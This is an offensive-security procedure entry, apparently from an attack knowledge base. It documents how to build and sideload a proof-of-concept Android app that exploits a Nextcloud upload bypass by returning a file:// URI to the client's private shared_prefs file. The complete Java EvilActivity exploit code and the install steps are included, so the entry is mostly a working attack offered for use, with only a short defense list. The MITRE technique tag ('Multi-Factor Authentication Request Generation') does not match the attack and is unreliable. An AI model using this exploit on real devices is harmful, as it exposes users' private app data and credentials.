---
id: uuid-proc-3
tags:
  - poc
  - android
  - malicious-app
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/EvilActivity-POC]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Multi-Factor Authentication Request Generation]]'
updated_at: '2025-12-14T17:24:41.971Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Multi-Factor Authentication Request Generation]]'
---
# Install Malicious POC App for File URI Provision

## Summary

This procedure builds and installs a proof-of-concept Android app that responds to file picker intents by providing URIs to protected private files, exploiting the Nextcloud upload bypass.

## Description

The POC app uses an EvilActivity to intercept intents and return URIs like file:///data/user/0/... , targeting Android's multi-user data paths not blocked by the app's validation.

## Requirements

1. Android Studio or build tools for APK compilation
2. Target device with unknown sources enabled
3. Knowledge of target app's private paths (e.g., shared_prefs)

## Defense

Defensive measures and detection strategies:

- Scan for sideloaded APKs with static analysis (e.g., MobSF)
- Monitor intent resolutions for anomalous URIs
- Enforce app sandboxing and path restrictions

## Objectives

1. Deploy app to supply malicious file URIs
2. Enable bypass of /data/data/ check
3. Facilitate private file access via intent

## Instructions

### Step 1: Implement EvilActivity

**Context**: Code the activity to parse and return private URI.

Execute [[commands/EvilActivity-POC]] in Android project:

```java
public class EvilActivity extends AppCompatActivity { private static final String LOG_TAG = EvilActivity.class.getName(); final static String PRIVATE_URI = "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml"; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d("heen", "EvilActivity started!"); setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI))); finish(); } }
```

> Builds activity that sets RESULT_OK with private URI. Expected output: APK compiles without errors.

### Step 2: Build and Install APK

**Context**: Package and deploy to device.

Use Android Studio: Build > Generate Signed APK, then adb install.

**Expected Output**: App installed as "poc".

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Multi-Factor Authentication Request Generation]] User Execution

### Sub-Techniques


## Commands Used

- [[commands/EvilActivity-POC]]

## Tools Used


## Tags

- [[malicious-app]]
- [[uri-provision]]
